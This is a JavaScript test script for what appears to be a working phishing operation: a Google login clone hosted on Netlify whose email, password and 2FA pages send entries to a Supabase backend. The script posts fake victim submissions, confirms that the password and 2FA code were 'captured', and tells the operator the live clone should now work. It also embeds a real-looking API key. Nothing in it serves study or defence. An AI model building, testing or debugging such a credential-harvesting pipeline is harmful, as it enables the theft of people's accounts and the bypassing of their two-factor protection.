// TEST LIVE WEBSITE → SUPABASE CONNECTION
console.log('🌐 TESTING LIVE WEBSITE CONNECTION');
console.log('URL: https://google-login-clone-demo.netlify.app');
console.log('==========================================\n');

const SUPABASE_URL = 'https://nqsdardermkzppeaazbb.supabase.co';
const ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5xc2RhcmRlcm1renBwZWFhemJiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTA5NTY1NjUsImV4cCI6MjA2NjUzMjU2NX0.1sxR4WFiuwZbfGBSr-lZCMMbRfAGwwFpZOx_bzqsvbc';

const headers = {
    'Authorization': `Bearer ${ANON_KEY}`,
    'apikey': ANON_KEY,
    'Content-Type': 'application/json'
};

async function testLiveWebsite() {
    console.log('🎯 SIMULATING LIVE WEBSITE INTERACTIONS\n');
    
    const testEmail = `live.website.test.${Date.now()}@example.com`;
    
    // Test 1: Get current request count
    console.log('1️⃣ Getting current request count...');
    let initialCount = 0;
    try {
        const response = await fetch(`${SUPABASE_URL}/functions/v1/admin-api/api/pending`, { headers });
        if (response.ok) {
            const data = await response.json();
            initialCount = data.length;
            console.log('✅ Current requests in database:', initialCount);
        } else {
            console.log('❌ Failed to get current count');
            return;
        }
    } catch (error) {
        console.log('❌ Error getting current count:', error.message);
        return;
    }
    
    console.log('');
    
    // Test 2: Simulate what live website should be doing
    console.log('2️⃣ Simulating live website data submission...');
    
    // Email submission (index.html)
    try {
        const response = await fetch(`${SUPABASE_URL}/functions/v1/admin-api/api/request`, {
            method: 'POST',
            headers,
            body: JSON.stringify({
                email: testEmail,
                password: '',
                twofa: '',
                userAgent: 'Live Website Test Browser',
                currentPage: 'index.html'
            })
        });
        
        if (response.ok) {
            const data = await response.json();
            console.log('✅ Email submission successful, Request ID:', data.requestId);
        } else {
            console.log('❌ Email submission failed');
            return;
        }
    } catch (error) {
        console.log('❌ Email submission error:', error.message);
        return;
    }
    
    // Password submission (password.html)
    try {
        const response = await fetch(`${SUPABASE_URL}/functions/v1/admin-api/api/request`, {
            method: 'POST',
            headers,
            body: JSON.stringify({
                email: testEmail,
                password: 'live.website.password123',
                twofa: '',
                userAgent: 'Live Website Test Browser',
                currentPage: 'password.html'
            })
        });
        
        if (response.ok) {
            const data = await response.json();
            console.log('✅ Password submission successful, Request ID:', data.requestId);
        } else {
            console.log('❌ Password submission failed');
            return;
        }
    } catch (error) {
        console.log('❌ Password submission error:', error.message);
        return;
    }
    
    // 2FA submission (verify.html)  
    try {
        const response = await fetch(`${SUPABASE_URL}/functions/v1/admin-api/api/request`, {
            method: 'POST',
            headers,
            body: JSON.stringify({
                email: testEmail,
                password: '',
                twofa: '987654',
                userAgent: 'Live Website Test Browser',
                currentPage: 'verify.html'
            })
        });
        
        if (response.ok) {
            const data = await response.json();
            console.log('✅ 2FA submission successful, Request ID:', data.requestId);
        } else {
            console.log('❌ 2FA submission failed');
            return;
        }
    } catch (error) {
        console.log('❌ 2FA submission error:', error.message);
        return;
    }
    
    console.log('');
    
    // Test 3: Verify data was added
    console.log('3️⃣ Verifying data was added to database...');
    try {
        const response = await fetch(`${SUPABASE_URL}/functions/v1/admin-api/api/pending`, { headers });
        if (response.ok) {
            const data = await response.json();
            const newCount = data.length;
            const addedCount = newCount - initialCount;
            
            console.log('✅ Database verification:');
            console.log('   📊 Initial count:', initialCount);
            console.log('   📊 Current count:', newCount);
            console.log('   📈 Added requests:', addedCount);
            
            // Find our test requests
            const testRequests = data.filter(req => req.email === testEmail);
            console.log('   🎯 Our test requests:', testRequests.length);
            
            if (testRequests.length > 0) {
                console.log('   📧 Test email found:', testRequests[0].email);
                console.log('   🔐 Password captured:', testRequests.find(r => r.password && r.password !== 'undefined')?.password || 'Not found');
                console.log('   📱 2FA captured:', testRequests.find(r => r.twofa && r.twofa !== 'undefined')?.twofa || 'Not found');
            }
        } else {
            console.log('❌ Failed to verify database');
        }
    } catch (error) {
        console.log('❌ Database verification error:', error.message);
    }
    
    console.log('\n==========================================');
    console.log('📋 DIAGNOSIS FOR LIVE WEBSITE:');
    console.log('==========================================');
    
    console.log('✅ Supabase backend is working');
    console.log('✅ API endpoints are functional');
    console.log('✅ Test data can be submitted');
    console.log('');
    console.log('🔍 IF LIVE WEBSITE STILL NOT WORKING:');
    console.log('1. 🔄 Wait 2-3 minutes for Netlify deployment to complete');
    console.log('2. 🌐 Clear browser cache and reload https://google-login-clone-demo.netlify.app');
    console.log('3. 🛠️ Open browser DevTools → Console to check for errors');
    console.log('4. 📱 Try submitting a test email on the live site');
    console.log('5. 👀 Check if data appears in Admin GUI (GUI Local/gui.html)');
    console.log('');
    console.log('💡 The fix has been deployed. Live website should work now!');
    console.log('==========================================');
}

testLiveWebsite().catch(console.error); 